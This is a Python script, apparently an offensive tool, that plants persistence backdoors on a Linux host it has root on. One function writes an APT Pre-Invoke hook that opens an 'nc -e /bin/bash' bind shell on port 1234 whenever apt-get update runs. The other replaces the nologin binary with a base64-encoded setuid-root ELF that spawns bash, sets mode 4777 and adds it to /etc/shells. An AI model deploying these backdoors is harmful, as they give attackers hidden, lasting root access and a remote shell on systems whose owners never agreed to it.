#Python Linux Persistance
import os 
import base64

#Credit: swisskyrepo (PayloadAllTheThings)
def apt_backdoor():
	payload = 'APT::Update::Pre-Invoke {"nc -lvp 1234 -e /bin/bash 2> /dev/null &"};'
	#Next time apt-get update is done the server will callback to your shell listener
	if os.path.isdir('/etc/apt/apt.conf.d'):
		with open('/etc/apt/apt.conf.d/shell', 'w') as apt:
			print('[+] Writing backdoor to /etc/apt/apt.conf.d/shell')
			print('[*] Make sure you set up your listener. Once the apt-get update is run it will connect back')
			apt.write(payload)
	else:
		print('Could not find /etc/apt/apt.conf.d')

#Credit: Dan Fedele
def suid_backdoor():
	shell = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAGAAAAAAAAkAYAAAAAAAABAAAAAAAAAAEAAAAAAAAADAAAAAAAAABgBQAAAAAAAA0AAAAAAAAAlAcAAAAAAAAZAAAAAAAAAKgNIAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAsA0gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAACYAgAAAAAAAAUAAAAAAAAAkAMAAAAAAAAGAAAAAAAAALgCAAAAAAAACgAAAAAAAACSAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAACoDyAAAAAAAAIAAAAAAAAASAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAAAYBQAAAAAAAAcAAAAAAAAAWAQAAAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAB4AAAAAAAAACAAAAAAAAAD7//9vAAAAAAEAAAgAAAAA/v//bwAAAAA4BAAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAACIEAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuA0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAlgUAAAAAAACmBQAAAAAAALYFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBAgAAAAAABHQ0M6IChVYnVudHUgNy40LjAtMXVidW50dTF+MTguMDQuMSkgNy40LjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCAAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCAAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCAAAAAAAAAAAAAAAAAAAAAAAAAwAGAJADAAAAAAAAAAAAAAAAAAAAAAAAAwAHACIEAAAAAAAAAAAAAAAAAAAAAAAAAwAIADgEAAAAAAAAAAAAAAAAAAAAAAAAAwAJAFgEAAAAAAAAAAAAAAAAAAAAAAAAAwAKABgFAAAAAAAAAAAAAAAAAAAAAAAAAwALAGAFAAAAAAAAAAAAAAAAAAAAAAAAAwAMAIAFAAAAAAAAAAAAAAAAAAAAAAAAAwANAMAFAAAAAAAAAAAAAAAAAAAAAAAAAwAOANAFAAAAAAAAAAAAAAAAAAAAAAAAAwAPAJQHAAAAAAAAAAAAAAAAAAAAAAAAAwAQAKAHAAAAAAAAAAAAAAAAAAAAAAAAAwARALAHAAAAAAAAAAAAAAAAAAAAAAAAAwASAPAHAAAAAAAAAAAAAAAAAAAAAAAAAwATAKgNIAAAAAAAAAAAAAAAAAAAAAAAAwAUALANIAAAAAAAAAAAAAAAAAAAAAAAAwAVALgNIAAAAAAAAAAAAAAAAAAAAAAAAwAWAKgPIAAAAAAAAAAAAAAAAAAAAAAAAwAXAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAYABAQIAAAAAAAAAAAAAAAAAAAAAAAAwAZAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAOAAAGAAAAAAAAAAAAAAAAAAAOAAAAAgAOAEAGAAAAAAAAAAAAAAAAAAAhAAAAAgAOAJAGAAAAAAAAAAAAAAAAAAA3AAAAAQAYABAQIAAAAAAAAQAAAAAAAABGAAAAAQAUALANIAAAAAAAAAAAAAAAAABtAAAAAgAOANAGAAAAAAAAAAAAAAAAAAB5AAAAAQATAKgNIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACgAAAAAQASAPQIAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACuAAAAAAATALANIAAAAAAAAAAAAAAAAAC/AAAAAQAVALgNIAAAAAAAAAAAAAAAAADIAAAAAAATAKgNIAAAAAAAAAAAAAAAAADbAAAAAAARALAHAAAAAAAAAAAAAAAAAADuAAAAAQAWAKgPIAAAAAAAAAAAAAAAAAAEAQAAEgAOAJAHAAAAAAAAAgAAAAAAAAAUAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABsAQAAIAAXAAAQIAAAAAAAAAAAAAAAAAAwAQAAEAAXABAQIAAAAAAAAAAAAAAAAAAOAQAAEgAPAJQHAAAAAAAAAAAAAAAAAAA3AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABLAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAQAAEAAXAAAQIAAAAAAAAAAAAAAAAAB3AQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQIXAAgQIAAAAAAAAAAAAAAAAACTAQAAEQAQAKAHAAAAAAAABAAAAAAAAACiAQAAEgAOACAHAAAAAAAAZQAAAAAAAAC6AAAAEAAYABgQIAAAAAAAAAAAAAAAAABwAQAAEgAOANAFAAAAAAAAKwAAAAAAAACyAQAAEAAYABAQIAAAAAAAAAAAAAAAAAC+AQAAEgAOANoGAAAAAAAAOgAAAAAAAADDAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADXAQAAEQIXABAQIAAAAAAAAAAAAAAAAADjAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAD9AQAAEgAAAAAAAAAAAAAAAAAAAAAAAAARAgAAIgAAAAAAAAAAAAAAAAAAAAAAAACsAQAAEgALAGAFAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTcAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AHNoZWxsLmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAHN5c3RlbUBAR0xJQkNfMi4yLjUAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX19saWJjX2NzdV9pbml0AF9fYnNzX3N0YXJ0AG1haW4Ac2V0Z2lkQEBHTElCQ18yLjIuNQBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAHNldHVpZEBAR0xJQkNfMi4yLjUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3Ry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'
	shell = base64.b64decode(shell)

	if os.path.isfile('/usr/sbin/nologin'):
		f = '/usr/sbin/nologin'
		with open(f, 'wb') as nologin:
			print('[+] Writing backdoor to /usr/sbin/nologin')
			nologin.write(shell)
		os.chown(f, 0, 0)
		os.chmod(f, 0o4777)

		with open('/etc/shells', 'a') as shells:
			print('[+] Adding to /etc/shells')
			shells.write(f)

	elif os.path.isfile('/sbin/nologin'):
		f = '/sbin/nologin'
		with open(f, 'wb') as nologin:
			print('[+] Writing backdoor to /sbin/nologin')
			nologin.write(shell)
		os.chown(f, 0, 0)
		os.chmod(f, 0o4777)

		with open('/etc/shells', 'a') as shells:
			print('[+] Adding to /etc/shells')
			shells.write(f)

	else:
		print('Could not find nologin file')
		
def main():
	suid_backdoor()
	apt_backdoor()

if __name__ == '__main__':
	if os.geteuid() != 0:
		exit('You must be root to run this script')
	else:
		main()
